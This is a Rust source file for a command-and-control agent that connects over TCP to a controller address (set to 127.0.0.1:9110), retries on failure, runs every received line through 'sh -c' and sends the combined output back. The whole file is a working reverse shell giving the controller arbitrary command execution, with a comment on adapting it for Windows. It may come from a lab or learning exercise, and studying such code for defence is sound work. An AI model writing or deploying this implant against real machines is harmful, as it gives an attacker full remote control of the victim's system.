use std::io::{Result, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;
use std::{println};
use std::thread::sleep;
use std::time::Duration;

fn main() -> Result<()> {
    // Controller's IP address
    let addr = "127.0.0.1:9110";

    let max_attempts = 10;
    let mut attempts = 0;
    let mut stream: TcpStream;

    println!("Attemting connection to controller at {}...", addr);

    // Loop to attempt connection multiple times in case the controller isn't ready
    loop {
        attempts += 1;

        match TcpStream::connect(addr) {
            Ok(connected_stream) => {
                stream = connected_stream;
                println!("Connected to controller at {}!", addr);
                break;
            }

            Err(e) => {
                if attempts >= max_attempts {
                    eprintln!("Failed to connect to controller after {} attempts: {}", max_attempts, e);
                    return Err(e);
                }
                println!("Attempt {}/{} failed ({}). Retrying in 1 second...", attempts, max_attempts, e);
                sleep(Duration::from_secs(1));
            }
        }
    }

    let reader_stream = stream.try_clone()?;
    let mut reader = BufReader::new(reader_stream);
    let mut command_line = String::new();

    loop {
        command_line.clear();
        let bytes_read = reader.read_line(&mut command_line)?;

        if bytes_read == 0 {
            println!("Connection closed by controller.");
            break;
        }

        let cmd = command_line.trim();
        if cmd.is_empty() {
            continue;
        }

        println!("Executing command: {}", cmd);

        // Execute the command using the system shell
        // (Use "cmd" and "/C" instead of "sh" and "-c" if you run this agent on Windows)
        let output_bytes = match Command::new("sh").arg("-c").arg(cmd).output() {
            Ok(out) => {
                let mut res = out.stdout;
                res.extend(out.stderr); // Combine stdout and stderr so you see errors too
                res
            }
            Err(e) => format!("Failed to execute command: {}\n", e).into_bytes(),
        };

        // Send the output back across the stream to the controller
        stream.write_all(&output_bytes)?;
        stream.flush()?;
    }

    Ok(())
}